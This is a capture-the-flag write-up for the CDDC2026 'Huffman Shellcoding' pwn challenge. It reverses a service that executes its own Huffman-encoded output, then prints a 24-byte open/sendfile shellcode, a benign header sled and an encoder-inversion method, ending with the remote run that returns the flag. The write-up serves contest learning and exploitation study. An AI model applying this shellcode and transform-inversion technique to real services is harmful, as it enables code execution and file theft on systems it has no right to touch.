---
title: "CDDC2026 — Huffman Shellcoding (pwn)"
pubDate: "2026-08-15"
updatedDate: "2026-08-15"
event: "CDDC2026"
author: ""
score: "420"
description: |
  > There is a service that performs Huffman Encoding.
  > Craft your input data to execute shellcode and capture the flag.
  >
  > `nc cddc2026.xyz 9000`
  > Flag Format: `CDDC2026{}`
tags: ["pwn"]
---

# Huffman Shellcoding — CDDC2026 (Pwn, 420 pts)

**Flag:** `CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}`

> There is a service that performs Huffman Encoding.
> Craft your input data to execute shellcode and capture the flag.
> `nc cddc2026.xyz 9000` · Flag Format: `CDDC2026{}`

---

## 1. Reading the hints in the description

The prompt is short but every word matters:

| Phrase                          | What it tells you                                                                                                                                          |
| ------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |
| "performs **Huffman Encoding**" | The server _compresses_ your input. The thing that runs is the **encoder's output**, not your raw input. You must work _backwards_ through the compressor. |
| "**Craft your input data**"     | You control only the bytes you send; you do not get to write machine code directly.                                                                        |
| "**to execute shellcode**"      | The encoded output is placed in executable memory and called — classic "shellcode through a transform" puzzle.                                             |
| "**capture the flag**"          | Goal is to read a file (turned out to be `/flag`), so a self-contained `open`/`read`/`write`/`sendfile` payload is enough — no ROP, no leak.               |
| Flag format `CDDC2026{}`        | Confirms it's a remote service flag, read at exploit time.                                                                                                 |

So the mental model from the description alone:

```
your input ──Huffman encode──► header || bitstream ──(mmap RWX + call)──► executes as code
```

The whole challenge is **inverting the encoder**: pick input bytes that _compress into_ the shellcode you want.

---

## 2. Recon

A distributable was attached (Google-Drive link → `chal.zip`) containing a `Dockerfile`, `docker-compose.yml`, and a static, stripped x86-64 ELF `huffman_runner`.

Key facts from the Dockerfile:

```dockerfile
RUN echo "CDDC{test_flag}" > /flag && chmod 444 /flag && chown root:root /flag
USER ctf
CMD ["socat","TCP-LISTEN:9000,reuseaddr,fork","EXEC:/home/ctf/huffman_runner,stderr"]
```

- `/flag` is **world-readable** (mode `444`) → no privesc needed, just read it.
- `socat … EXEC … ,stderr` → the program's **stdin/stdout/stderr are the socket** (fds 0/1/2).

Black-box poking (send bytes, half-close, read reply) revealed the validation surface:

```
"Error: need at least 2 distinct bytes"
"Error: input too large"
"Error: insufficient compression ratio (4.00)"
```

A 113-byte highly-compressible input produced **no output and no error** — a strong sign the encoded result was being _executed_ (and our junk "code" just crashed silently).

---

## 3. Reversing the encoder

Disassembling `huffman_runner` (the interesting code lives in `0x401770–0x4021df`) gave the full algorithm:

1. Read **≤113 bytes** from stdin until EOF. Require **≥2 distinct bytes**.
2. Count byte frequencies; build a symbol table **sorted by frequency DESC, ties by byte value ASC**. Rank 0 = most frequent.
3. Assign a **code length by rank** (not a real Huffman tree — a fixed-shape code):
   `ranks 0–1 → 1 bit, 2–5 → 2, 6–13 → 3, 14–29 → 4, 30–61 → 5, 62–125 → 6`
   and code value = `rank − group_base`.
4. Build a **header** of `2·m+1` bytes: `[ m, sym0, len0, sym1, len1, … ]`.
5. **Bit-pack** the whole input MSB-first using each byte's `(len, value)` code → `enc`, with `enc_len = ceil(bits/8)`.
6. Require compression ratio **`n / enc_len ≥ 4.5`** (a `comisd` against the constant `4.5`).
7. `mmap` an **RWX** page, copy `header || enc`, install a **seccomp** filter, then `call` the buffer.
   Execution starts at byte 0 (`= m`) and **falls straight through the header into `enc`**. `rax` = buffer base at entry.

The seccomp filter (decoded from the BPF struct in `main`) allows **only**:

```
open(2), openat(257), read(0), write(1), sendfile(40), close(3), exit_group(231)   → else SIGKILL
```

I wrote a faithful Python re-implementation of steps 1–6 (`huff_sim.py`) and validated it against the live error messages (e.g. it reproduces the exact `ratio 4.00`).

---

## 4. The core difficulty: the byte budget

Two facts collide:

- **The executed code = `header || enc`, and the header executes first.** Every header instruction is forced into a rigid 2-byte form because a fixed _length_ byte (value 1–6) sits between every controllable _symbol_ byte. You can't place arbitrary multi-byte instructions (no `lea`, no register-zeroing `xor esi,esi`) in the header.
- **The ratio rule caps `enc`.** `enc_len ≤ n/4.5 ≤ 113/4.5 ≈ 25`, and keeping a valid code table realistically caps usable `enc` at ~24 bytes.

A naive `open("/flag")` + `sendfile` that sets up _every_ register is ~30+ bytes → doesn't fit. So the question becomes: **how few registers must I actually set?**

---

## 5. The unlock: dump the entry registers

I couldn't `apt install gdb/strace` in WSL (no package network), so I compiled a tiny **ptrace tracer** (`trace_regs.c`, built with WSL `gcc`) that breakpoints `call rax` (`0x4021c3`) and dumps registers:

```
RAX = 0x7f7c56e6e000   (buffer base)
RSI = 2                ← O_RDWR; must be zeroed for open()
RDX = 0                ← already NULL  → sendfile offset is free!
R10 = 0x452ab1         ← already huge  → sendfile count is free!
R8  = 0,  R9 = 0       ← zero registers available
```

This is the whole game. `rdx` (sendfile offset pointer = NULL) and `r10` (count) are **already correct**, so I only need to **zero `rsi`** for `open`'s `O_RDONLY`. The shellcode collapses to **24 bytes**.

---

## 6. The shellcode (24 bytes)

```asm
xor   esi, esi          ; 31 f6          O_RDONLY (rsi was 2)
lea   rdi, [rax+0x24]   ; 48 8d 78 24    -> "/flag" (string at end of enc)
push  2 ; pop rax       ; 6a 02 58       open
syscall                 ; 0f 05          rax = fd (=3, clean high bits)
xchg  eax, esi          ; 96             rsi = fd  (1-byte in_fd move); eax -> 0
push  1 ; pop rdi       ; 6a 01 5f       out_fd = 1 (socket)
mov   al, 0x28          ; b0 28          rax = 40 = sendfile (eax was 0)
syscall                 ; 0f 05          sendfile(1, fd, NULL=rdx, count=r10) -> flag to socket
db    "/flag"           ; 2f 66 6c 61 67
```

Tricks that shaved it to exactly 24 bytes:

- `xchg eax,esi` (1 byte) instead of `push rax; pop rsi` (2 bytes) to move the fd.
- `mov al,0x28` (2 bytes) works because `fd=3` leaves `rax`'s high bits zero after `open`.
- No NUL after `/flag` — the mmap page is zero-filled, so the byte after the string is already `0`.
- `lea rdi,[rax+0x24]` is **buffer-relative**, so it's ASLR-independent and identical on remote.

---

## 7. Inverting the encoder (the tiler)

I need the encoder's output `enc` to be _exactly_ those 24 bytes, and the header to be a harmless run-in. Design:

**8-symbol code table** with byte values chosen so the header is a benign ALU sled:

| rank | byte                  | code          | header role                     |
| ---- | --------------------- | ------------- | ------------------------------- |
| 0,1  | `0x40`, `0xA8`        | `0`, `1`      | fillers (high freq, 1 bit each) |
| 2–5  | `0xB1,0xB3,0xB5,0xB7` | `00,01,10,11` | pairs (2 bits)                  |
| 6,7  | `0x3C,0x6A`           | `000,001`     | rare (3 bits)                   |

`m = 8`, so byte 0 of the header is `0x08`. The header bytes
`08 40 01 A8 01 B1 02 B3 02 B5 02 B7 02 3C 03 6A 03` disassemble to:

```
or  [rax+1], al     ; the 0x08 + modrm 0x40 + disp 0x01 realigns to a 3-byte insn
test al, 1
mov cl, 2 ; mov bl, 2 ; mov ch, 2 ; mov bh, 2
cmp al, 3
push 3
```

— all harmless (touch only `al/flags/cl/bl/ch/bh/rsp`, **preserve `rax`**), and the realign makes the final instruction end **exactly** at the start of `enc` (so it doesn't eat the first shellcode byte). Execution then falls into the 24-byte shellcode.

**The tiler** then chooses the _order_ of the 112 input bytes so the bit-packed output equals the shellcode:

- `0x40`/`0xA8` are 1-bit codes → flexible "write any bit";
- the four `0xB?` pairs cover 2-bit chunks (keeps `n` under 113);
- `0x3C`/`0x6A` used a few times so they exist at their ranks.

Counts are picked so fillers > pairs > rare → the realized ranks (hence the whole code table) come out exactly as designed. Result: `n = 112`, `enc_len = 24`, ratio `4.667`, and `encode(input).enc == shellcode` byte-for-byte (verified by the simulator and `capstone` disassembly).

---

## 8. Firing it

Verified against a local copy of the Docker container first:

```
send_local(final_in.bin)  ->  b'CDDC{test_flag}\n'
```

Then remote:

```
$ python fire_remote.py
sending 112 bytes to cddc2026.xyz:9000 ...
attempt 0: b'CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}\n'

FLAG: CDDC2026{huffm4n_sh3llc0d3_c0mpr3ss_2_pwn}
```

---

## 9. Files

| File             | Purpose                                                                               |
| ---------------- | ------------------------------------------------------------------------------------- |
| `huff_sim.py`    | Faithful Python model of the encoder (validated vs the live service).                 |
| `huff_tools.py`  | `build_input`, `disasm` (capstone), `asm` (keystone), `send_local`, `send_remote`.    |
| `trace_regs.c`   | ptrace tracer that dumps registers at `call rax` (built with WSL gcc).                |
| `final.py`       | Builds the exploit: code table + tiler → `final_in.bin`, verifies `enc == shellcode`. |
| `final_in.bin`   | The 112-byte payload.                                                                 |
| `fire_remote.py` | Sends the payload to the remote and prints the flag.                                  |

## 10. Takeaways

- "Shellcode through a transform" = **invert the transform**; design the shellcode to fit what the transform can emit, not the other way around.
- When a byte budget looks impossible, **measure the entry register state** before assuming you must set everything — here `rdx=0` and a large `r10` were gifts that turned a ~30-byte requirement into 24.
- A 30-line ptrace stub beats fighting a missing debugger.
- The header's interleaved fixed bytes are the real puzzle: choosing symbol byte values so the _uncontrollable_ bytes still disassemble into a harmless, `rax`-preserving sled is what makes the whole thing land.
